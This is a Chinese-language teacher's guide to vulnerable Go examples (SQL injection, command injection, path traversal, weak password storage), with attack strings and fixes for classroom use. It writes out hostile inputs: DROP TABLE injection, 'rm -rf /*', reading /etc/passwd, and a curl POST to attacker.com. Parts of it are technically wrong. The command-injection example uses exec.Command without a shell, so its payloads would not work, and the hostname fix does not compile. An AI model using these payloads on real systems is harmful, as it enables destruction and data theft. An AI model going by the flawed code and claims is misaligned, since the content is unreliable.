# Go 安全漏洞示例代码 - 教师指南

本文档是教师版指南，详细说明了每个示例中包含的安全漏洞、潜在风险、攻击方式以及解决方案。

## 1. SQL 注入漏洞 (`sql_injection.go`)

### 漏洞代码位置
```go
// 第12-16行：不安全的数据库凭证硬编码
const (
    dbUser     = "root"
    dbPassword = "password123"
    dbName     = "test_db"
)

// 第27-28行：不安全的 SQL 查询拼接
username := r.URL.Query().Get("username")
query := "SELECT * FROM users WHERE username = '" + username + "'"
```

### 存在的问题
- 直接拼接用户输入到 SQL 查询语句中
- 未对用户输入进行任何过滤或转义
- 数据库连接信息硬编码在代码中

### 攻击示例
```
/user?username=admin' OR '1'='1
/user?username=admin'; DROP TABLE users; --
```

### 潜在危害
- 未授权访问数据库数据
- 数据库结构被破坏
- 数据泄露或被篡改

### 解决方案
```go
// 使用参数化查询
query := "SELECT * FROM users WHERE username = ?"
rows, err := db.Query(query, username)

// 使用环境变量存储数据库凭证
dbUser := os.Getenv("DB_USER")
dbPassword := os.Getenv("DB_PASSWORD")
```

## 2. 命令注入漏洞 (`command_injection.go`)

### 漏洞代码位置
```go
// 第11-12行：不安全的命令执行
host := r.URL.Query().Get("host")
cmd := exec.Command("ping", "-c", "1", host)
```

### 存在的问题
- 直接将用户输入作为系统命令参数
- 未对命令参数进行验证和过滤
- 未限制命令执行的范围

### 攻击示例
```
/ping?host=google.com;rm -rf /*
/ping?host=google.com && cat /etc/passwd
/ping?host=;curl -X POST http://attacker.com/data
```

### 潜在危害
- 执行恶意系统命令
- 文件系统被破坏
- 敏感信息泄露
- 系统被远程控制

### 解决方案
```go
// 使用白名单验证主机名
func isValidHostname(hostname string) bool {
    return regexp.MatchString(`^[a-zA-Z0-9][a-zA-Z0-9\-\.]+[a-zA-Z0-9]$`, hostname)
}

// 限制命令执行
if !isValidHostname(host) {
    http.Error(w, "Invalid hostname", http.StatusBadRequest)
    return
}
```

## 3. 路径遍历漏洞 (`path_traversal.go`)

### 漏洞代码位置
```go
// 第13-14行：不安全的文件路径构建
filename := r.URL.Query().Get("file")
filePath := filepath.Join("files", filename)

// 第31行：不安全的目录权限
os.MkdirAll("files", 0777)
```

### 存在的问题
- 未对文件路径进行验证
- 使用用户输入直接构建文件路径
- 文件目录权限设置过于宽松(0777)
- 未限制文件访问范围

### 攻击示例
```
/download?file=../../../etc/passwd
/download?file=../../../var/log/auth.log
/download?file=../config.json
```

### 潜在危害
- 未授权访问系统文件
- 敏感配置信息泄露
- 系统日志泄露

### 解决方案
```go
// 验证文件路径
func isValidPath(path string) bool {
    cleanPath := filepath.Clean(path)
    return !strings.Contains(cleanPath, "..")
}

// 限制文件访问范围
basePath := "files"
requestedPath := filepath.Join(basePath, filename)
if !strings.HasPrefix(requestedPath, basePath) {
    http.Error(w, "Invalid path", http.StatusBadRequest)
    return
}

// 使用更安全的权限
os.MkdirAll("files", 0750)
```

## 4. 不安全的密码存储 (`unsafe_password.go`)

### 漏洞代码位置
```go
// 第11行：不安全的用户数据存储
var users = make(map[string]string)

// 第17-19行：不安全的密码存储
password := r.FormValue("password")
encodedPassword := base64.StdEncoding.EncodeToString([]byte(password))
users[username] = encodedPassword

// 第28-29行：不安全的密码比较
encodedPassword := base64.StdEncoding.EncodeToString([]byte(password))
if storedPassword, exists := users[username]; exists && storedPassword == encodedPassword {
```

### 存在的问题
- 使用简单的 base64 编码存储密码
- 未使用加盐哈希
- 密码比较可能存在时序攻击风险
- 在内存中使用map存储用户数据

### 攻击示例
```
1. base64 编码可以轻易解码：
   "cGFzc3dvcmQxMjM=" -> "password123"
2. 彩虹表攻击：预计算的哈希值可以用于破解密码
```

### 潜在危害
- 密码可以被轻易解码
- 用户账户被盗用
- 相同密码可以被识别（没有加盐）

### 解决方案
```go
import "golang.org/x/crypto/bcrypt"

// 存储密码
hashedPassword, err := bcrypt.GenerateFromPassword([]byte(password), bcrypt.DefaultCost)
if err != nil {
    // 处理错误
}
users[username] = string(hashedPassword)

// 验证密码
err := bcrypt.CompareHashAndPassword([]byte(storedPassword), []byte(password))
if err == nil {
    // 密码正确
}
```

## 教学建议

1. 让学生先尝试运行这些示例
2. 要求学生识别每个示例中可能存在的安全问题
3. 讨论这些漏洞在现实中可能造成的危害
4. 引导学生思考如何修复这些问题
5. 介绍相关的安全最佳实践

## 扩展练习建议

1. 要求学生编写测试用例来验证漏洞
2. 让学生实现安全的版本
3. 进行代码审查练习
4. 讨论其他可能的攻击方式
5. 研究真实世界中类似的安全事件

## 评分标准建议

在学生进行代码审查时，可以根据以下几点进行评分：

1. 漏洞识别能力（30分）
   - 是否找到所有主要漏洞点
   - 是否理解漏洞的原理
   - 是否能识别潜在的攻击向量

2. 风险评估能力（20分）
   - 是否能准确评估漏洞的严重程度
   - 是否能分析潜在的影响范围
   - 是否能预测可能的攻击场景

3. 解决方案设计（30分）
   - 解决方案的完整性
   - 解决方案的安全性
   - 解决方案的可实现性

4. 安全意识（20分）
   - 是否考虑到边界情况
   - 是否遵循安全最佳实践
   - 是否考虑到长期维护性 